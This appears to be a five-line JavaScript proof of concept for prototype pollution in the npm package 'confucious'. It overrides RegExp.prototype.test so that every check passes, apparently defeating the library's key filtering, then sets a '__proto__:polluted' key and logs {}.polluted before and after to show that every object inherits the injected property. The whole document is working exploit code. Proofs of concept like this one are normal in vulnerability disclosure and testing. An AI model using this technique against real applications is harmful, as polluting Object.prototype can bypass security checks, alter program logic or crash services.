RegExp.prototype.test = () => true;
console.log({}.polluted);
const confucious = require('confucious');
confucious.set('__proto__:polluted', 'yes');
console.log({}.polluted);